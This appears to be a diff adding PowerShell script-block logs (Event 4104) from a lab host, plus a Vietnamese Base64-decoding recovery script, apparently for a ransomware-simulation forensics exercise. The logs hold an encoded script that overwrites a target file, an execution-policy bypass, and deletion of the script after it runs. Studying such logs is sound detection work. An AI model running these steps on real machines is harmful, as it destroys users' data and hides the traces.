+    # Tham số 2: Chuỗi Base64 trực tiếp từ Log (Ví dụ: từ EID 4104)
+    [Parameter(Mandatory=$false)]
+    [string]$Base64Input
+)
+
+try {
+    # Kiểm tra tính hợp lệ của tham số
+    if (-not $EncryptedPath -and -not $Base64Input) {
+        Write-Error ""Lỗi: Bạn phải cung cấp -EncryptedPath hoặc -Base64Input.""
+        exit 1
+    }
+    if ($EncryptedPath -and $Base64Input) {
+        Write-Error ""Lỗi: Chỉ được cung cấp một trong hai tham số.""
+        exit 1
+    }
+
+    $base64Content = $null
+    $outputFileName = ""decoded_output.txt"" # Đổi tên file output thành .txt
+    $originalFileName = """"
+
+    # BƯỚC 1: Xử lý đầu vào (Input Handling)
+    if ($EncryptedPath) {
+        Write-Host ""[*] Bắt đầu giải mã từ file: $EncryptedPath""
+        
+        # 1. Kiểm tra file tồn tại
+        if (-not (Test-Path -Path $EncryptedPath -PathType Leaf)) {
+            Write-Error ""Lỗi: Không tìm thấy file mã hóa: $EncryptedPath""
+            exit 1
+        }
+        
+        # 2. Đọc nội dung file Base64 dưới dạng chuỗi (Đầu vào)
+        $base64Content = [System.IO.File]::ReadAllText($EncryptedPath)
+        
+        # 3. Định nghĩa tên file mới (Bỏ đi đuôi .encrypted)
+        $newDecryptedPath = $EncryptedPath.Replace("".encrypted"", "".recovered.txt"")
+        $outputFileName = $newDecryptedPath
+        $originalFileName = $EncryptedPath
+
+    } elseif ($Base64Input) {
+        Write-Host ""[*] Bắt đầu giải mã chuỗi Base64 trực tiếp (Output: $outputFileName)""
+        $base64Content = $Base64Input
+        $newDecryptedPath = $outputFileName
+        $originalFileName = ""Base64 Input""
+    }
+
+    # BƯỚC 2: Giải mã Base64 (Lần 1)
+    $contentBytes = [System.Convert]::FromBase64String($base64Content)
+
+    # BƯỚC 3: Decode Unicode (Lần 2) và Ghi ra file Text
+    # Dùng UTF8 Encoding để khôi phục (vì script gốc dùng UTF8Encoding không BOM)
+    $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
+    $decodedText = $utf8NoBom.GetString($contentBytes)
+
+    # Ghi nội dung đã decode (text) ra file mới
+    [System.IO.File]::WriteAllText($newDecryptedPath, $decodedText, $utf8NoBom)
+
+    Write-Host ""[+] Giải mã kép thành công!""
+    Write-Host ""[+] File gốc đã khôi phục: $newDecryptedPath""
+}
+catch {
+    Write-Error ""Gặp lỗi trong quá trình giải mã: $($_.Exception.Message)""
+    exit 1
+}
+'@ | Set-Content -Path .\decrypt.ps1 -Encoding UTF8
+@'
+# decrypt.ps1
+# SCRIPT GIẢI MÃ KÉP (Double Decode) cho Base64 + Unicode
+
+param(
+    # Tham số 1: Đường dẫn file mục tiêu (.encrypted)
+    [Parameter(Mandatory=$false)]
+    [string]$EncryptedPath,
+
+    # Tham số 2: Chuỗi Base64 trực tiếp từ Log (Ví dụ: từ EID 4104)
+    [Parameter(Mandatory=$false)]
+    [string]$Base64Input
+)
+
+try {
+    # Kiểm tra tính hợp lệ của tham số
+    if (-not $EncryptedPath -and -not $Base64Input) {
+        Write-Error ""Lỗi: Bạn phải cung cấp -EncryptedPath hoặc -Base64Input.""
+        exit 1
+    }
+    if ($EncryptedPath -and $Base64Input) {
+        Write-Error ""Lỗi: Chỉ được cung cấp một trong hai tham số.""
+        exit 1
+    }
+
+    $base64Content = $null
+    $outputFileName = ""decoded_output.txt"" # Đổi tên file output thành .txt
+    $originalFileName = """"
+
+    # BƯỚC 1: Xử lý đầu vào (Input Handling)
+    if ($EncryptedPath) {
+        Write-Host ""[*] Bắt đầu giải mã từ file: $EncryptedPath""
+        
+        # 1. Kiểm tra file tồn tại
+        if (-not (Test-Path -Path $EncryptedPath -PathType Leaf)) {
+            Write-Error ""Lỗi: Không tìm thấy file mã hóa: $EncryptedPath""
+            exit 1
+        }
+        
+        # 2. Đọc nội dung file Base64 dưới dạng chuỗi (Đầu vào)
+        $base64Content = [System.IO.File]::ReadAllText($EncryptedPath)
+        
+        # 3. Định nghĩa tên file mới (Bỏ đi đuôi .encrypted)
+        $newDecryptedPath = $EncryptedPath.Replace("".encrypted"", "".recovered.txt"")
+        $outputFileName = $newDecryptedPath
+        $originalFileName = $EncryptedPath
+
+    } elseif ($Base64Input) {
+        Write-Host ""[*] Bắt đầu giải mã chuỗi Base64 trực tiếp (Output: $outputFileName)""
+        $base64Content = $Base64Input
+        $newDecryptedPath = $outputFileName
+        $originalFileName = ""Base64 Input""
+    }
+
+    # BƯỚC 2: Giải mã Base64 (Lần 1)
+    $contentBytes = [System.Convert]::FromBase64String($base64Content)
+
+    # BƯỚC 3: Decode Unicode (Lần 2) và Ghi ra file Text
+    # Dùng UTF8 Encoding để khôi phục (vì script gốc dùng UTF8Encoding không BOM)
+    $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
+    $decodedText = $utf8NoBom.GetString($contentBytes)
+
+    # Ghi nội dung đã decode (text) ra file mới
+    [System.IO.File]::WriteAllText($newDecryptedPath, $decodedText, $utf8NoBom)
+
+    Write-Host ""[+] Giải mã kép thành công!""
+    Write-Host ""[+] File gốc đã khôi phục: $newDecryptedPath""
+}
+catch {
+    Write-Error ""Gặp lỗi trong quá trình giải mã: $($_.Exception.Message)""
+    exit 1
+}
+'@ | Set-Content -Path .\decrypt.ps1 -Encoding UTF8"
+"2025-11-16T08:06:10.477+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","ex
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+ex
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:06:12.380+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:09:21.779+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:09:26.612+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:09:32.237+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:09:40.639+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:10:09.813+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""08f1cb261457cc70a50d7cfd5344b43a0df54eff"" = @{
+    ""target"" = ""C:\Program Files\encrypt1.ps1"";
+    ""src_basename"" = ""encrypt1.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt1.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""08f1cb261457cc70a50d7cfd5344b43a0df54eff"" = @{
+    ""target"" = ""C:\Program Files\encrypt1.ps1"";
+    ""src_basename"" = ""encrypt1.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt1.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:10:10.002+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:10:10.124+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xkYXRhX2ltcG9ydGFudC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aClzCiAgICAKICAgICMgRW5jb2RlIEJhc2U2NCAobcO0IHBo4buPbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIEdoaSDEkcOoIG7hu5lpIGR1bmcgQmFzZTY0IHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKICAgIFNldC1Db250ZW50IC1QYXRoICRQYXRoIC1WYWx1ZSAkYmFzZTY0Q29udGVudCAtRW5jb2RpbmcgVVRGOAogICAgCiAgICBXcml0ZS1Ib3N0ICJbK10gVGjDoG5oIGPDtG5nISBGaWxlIMSRw6MgYuG7iyAnbcOjIGjDs2EnIChCYXNlNjQpLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGhp4buHbiB04bqhaTogJFBhdGgiCgp9IGNhdGNoIHsKICAgIFdyaXRlLUVycm9yICJH4bq3cCBs4buXaTogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCn0Kcwo=')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xkYXRhX2ltcG9ydGFudC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aClzCiAgICAKICAgICMgRW5jb2RlIEJhc2U2NCAobcO0IHBo4buPbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIEdoaSDEkcOoIG7hu5lpIGR1bmcgQmFzZTY0IHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKICAgIFNldC1Db250ZW50IC1QYXRoICRQYXRoIC1WYWx1ZSAkYmFzZTY0Q29udGVudCAtRW5jb2RpbmcgVVRGOAogICAgCiAgICBXcml0ZS1Ib3N0ICJbK10gVGjDoG5oIGPDtG5nISBGaWxlIMSRw6MgYuG7iyAnbcOjIGjDs2EnIChCYXNlNjQpLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGhp4buHbiB04bqhaTogJFBhdGgiCgp9IGNhdGNoIHsKICAgIFdyaXRlLUVycm9yICJH4bq3cCBs4buXaTogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCn0Kcwo=')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:10:10.171+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:10:10.203+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:10:20.197+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null"," powershell -ExecutionPolicy Bypass -File .\encrypt1.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+ powershell -ExecutionPolicy Bypass -File .\encrypt1.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:10:52.928+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","rm encrypt1.ps1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+rm encrypt1.ps1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:11:17.279+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""1cdf69eb24b18a7f4ad2f036c83493ca58527518"" = @{
+    ""target"" = ""C:\Program Files\encrypt1.ps1"";
+    ""src_basename"" = ""encrypt1.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt1.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""1cdf69eb24b18a7f4ad2f036c83493ca58527518"" = @{
+    ""target"" = ""C:\Program Files\encrypt1.ps1"";
+    ""src_basename"" = ""encrypt1.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt1.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:11:17.393+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:11:17.486+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xkYXRhX2ltcG9ydGFudC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aCkKICAgIAogICAgIyBFbmNvZGUgQmFzZTY0IChtw7QgcGjhu49uZyAnZW5jcnlwdGlvbicpCiAgICAkYmFzZTY0Q29udGVudCA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRjb250ZW50Qnl0ZXMpCiAgICAKICAgICMgR2hpIMSRw6ggbuG7mWkgZHVuZyBCYXNlNjQgdsOgbyBjaMOtbmggZmlsZSBn4buRYwogICAgU2V0LUNvbnRlbnQgLVBhdGggJFBhdGggLVZhbHVlICRiYXNlNjRDb250ZW50IC1FbmNvZGluZyBVVEY4CiAgICAKICAgIFdyaXRlLUhvc3QgIlsrXSBUaMOgbmggY8O0bmchIEZpbGUgxJHDoyBi4buLICdtw6MgaMOzYScgKEJhc2U2NCkuIgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgaGnhu4duIHThuqFpOiAkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkfhurdwIGzhu5dpOiAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKfQpzCg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            if($method) { $method.Invoke($Null, $Null) }
